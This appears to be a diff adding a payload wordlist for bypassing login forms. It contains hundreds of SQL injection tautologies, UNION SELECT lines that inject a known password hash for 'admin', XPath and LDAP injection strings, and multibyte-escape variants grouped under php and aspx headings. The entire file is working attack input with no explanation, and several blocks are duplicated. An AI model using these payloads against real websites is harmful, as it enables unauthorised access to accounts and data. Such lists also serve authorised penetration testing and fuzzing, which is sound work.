@@ -1,0 +1,335 @@
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+or 1=1 -- -
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+” or 0=0 –
+‘ or 0=0 #
+” or 0=0 #
+‘ or ‘x’='x
+” or “x”=”x
+‘) or (‘x’='x
+‘ or 1=1–
+” or 1=1–
+‘ or a=a–
+” or “a”=”a
+‘) or (‘a’='a
+“) or (“a”=”a
+hi” or “a”=”a
+hi” or 1=1 –
+hi’ or 1=1 –
+hi’ or ‘a’='a
+hi’) or (‘a’='a
+hi”) or (“a”=”)
+' OR 1=1 --+ 
+' or '1'='1 
+' or 1-- 
+') or true-- 
+') or ('')=(' 
+') or 1-- 
+') or ('x')=(' 
+" or true-- 
+" or ""=" 
+" or 1-- 
+" or "x"=" 
+") or true-- 
+") or ("")=(" 
+") or 1-- 
+") or ("x")=(" 
+')) or true-- 
+')) or ((''))=((' 
+')) or 1-- 
+')) or (('x'))=((' 
+'-' 
+' ' 
+'&' 
+'^' 
+'*' 
+' or ''-' 
+' or '' ' 
+' or ''&' 
+' or ''^' 
+' or ''*' 
+"-" 
+" " 
+"&" 
+"*" 
+" or ""-" 
+" or "" " 
+" or ""&" 
+" or ""^" 
+" or ""*" 
+or true-- 
+' or true-- 
+' or 'x'='x 
+') or ('x')=('x 
+')) or (('x'))=(('x 
+" or "x"="x 
+") or ("x")=("x 
+or 1=1 –
+or 0=0 –
+or 0=0 #
+or 1=1–
+
+
+
+
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+' or '1'='1
+' or ''='
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))&lt;10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+*
+*)(&
+*)(|(&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+pwd
+admin)(!(&(|
+pwd))
+admin))(|(|
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 1=1 limit 1 -- -+
+'="or'
+Pass1234.
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
+Pass1234." and 1=0 union select "admin",sha("Pass1234.
+Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
+%A8%27 Or 1=1-- 2
+%8C%A8%27 Or 1=1-- 2
+%bf' Or 1=1 -- 2
+%A8%27 Or 1-- 2
+%8C%A8%27 Or 1-- 2
+%bf' Or 1-- 2
+%A8%27Or(1)-- 2
+%8C%A8%27Or(1)-- 2
+%bf'Or(1)-- 2
+%A8%27||1-- 2
+%8C%A8%27||1-- 2
+%bf'||1-- 2
+%A8%27) Or 1=1-- 2
+%8C%A8%27) Or 1=1-- 2
+%bf') Or 1=1 -- 2
+%A8%27) Or 1-- 2
+%8C%A8%27) Or 1-- 2
+%bf') Or 1-- 2
+%A8%27)Or(1)-- 2
+%8C%A8%27)Or(1)-- 2
+%bf')Or(1)-- 2
+%A8%27)||1-- 2
+%8C%A8%27)||1-- 2
+%bf')||1-- 2
+''
+`
+``
+,
+""
+/
+//
+\
+\\
+;
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+' or 'a'='a
+') or ('a'='a
+‘ or 1=1 –
+1'or’1'=’1
+admin’–
+
+
+
+-----------------------------------php-------------------
+
+' or '1'='1 
+ 
+' or 1-- 
+') or true-- 
+') or ('')=(' 
+') or 1-- 
+') or ('x')=(' 
+" or true-- 
+" or ""=" 
+" or 1-- 
+" or "x"=" 
+") or true-- 
+") or ("")=(" 
+") or 1-- 
+") or ("x")=(" 
+')) or true-- 
+')) or ((''))=((' 
+')) or 1-- 
+')) or (('x'))=((' 
+'-' 
+' ' 
+'&' 
+'^' 
+'*' 
+' or ''-' 
+' or '' ' 
+' or ''&' 
+' or ''^' 
+' or ''*' 
+"-" 
+" " 
+"&" 
+"*" 
+" or ""-" 
+" or "" " 
+" or ""&" 
+" or ""^" 
+" or ""*" 
+or true-- 
+" or true-- 
+' or true-- 
+") or true-- 
+') or true-- 
+' or 'x'='x 
+') or ('x')=('x 
+')) or (('x'))=(('x 
+" or "x"="x 
+") or ("x")=("x 
+")) or (("x"))=(("x
+
+
+
+--------------------------aspx----------------------------
+
+or 1=1 –
+1'or’1'=’1
+admin’–
+” or 0=0 –
+or 0=0 –
+‘ or 0=0 #
+” or 0=0 #
+or 0=0 #
+‘ or ‘x’='x
+” or “x”=”x
+‘) or (‘x’='x
+‘ or 1=1–
+” or 1=1–
+or 1=1–
+‘ or a=a–
+” or “a”=”a
+‘) or (‘a’='a
+“) or (“a”=”a
+hi” or “a”=”a
+hi” or 1=1 –
+hi’ or 1=1 –
+hi’ or ‘a’='a
+hi’) or (‘a’='a
+hi”) or (“a”=”)
